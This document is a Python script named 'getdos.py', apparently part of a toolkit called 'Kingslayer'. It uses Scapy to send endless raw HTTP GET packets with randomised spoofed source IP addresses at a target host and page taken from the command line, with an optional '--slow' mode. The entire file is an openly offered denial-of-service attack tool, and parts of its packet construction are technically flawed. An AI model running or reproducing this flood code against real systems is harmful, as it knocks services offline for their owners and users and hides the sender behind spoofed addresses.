print("Kingslayer Python Script Loaded: getdos.py")


from scapy.all import *
import time
import sys

def sendGET(url, targetPage):
	# Get the MAC address of the gateway/router
	gateway_mac = getmacbyip(conf.route.route(url)[2])

	# Craft the GET request
	get_request = Ether() / IP(src=RandIP(), dst=url) / TCP(dport=80) / \
					Raw(load="GET " + targetPage + " HTTP/1.1\r\nHost: " + url + "\r\n\r\n")

	# Send the request and receive response
	sendp(get_request, verbose=False)

def dos(url, targetPage):
	print("Initiating DoS. Stay safe out there.")
	i = 0
	while True:
		try:
			sendGET(url, targetPage)
		except:
			print("Error: couldn't send GET requests.")
			return
		i += 1
		print("\rGET DoS in progress, total:", i, "requests", end="")

def slowdos(url, targetPage, d=0.001):
	print("Initiating DoS. Stay safe out there.")
	i = 0
	while True:
		try:
			sendGET(url, targetPage)
			time.sleep(d)
		except:
			print("Error: couldn't send GET requests.")
			return
		i += 1
		print("\rGET DoS in progress, total:", i, "requests", end="")

if __name__ == "__main__":
	if "--slow" not in sys.argv:
		dos(sys.argv[1], sys.argv[2])
	else:
		slowdos(sys.argv[1], sys.argv[2])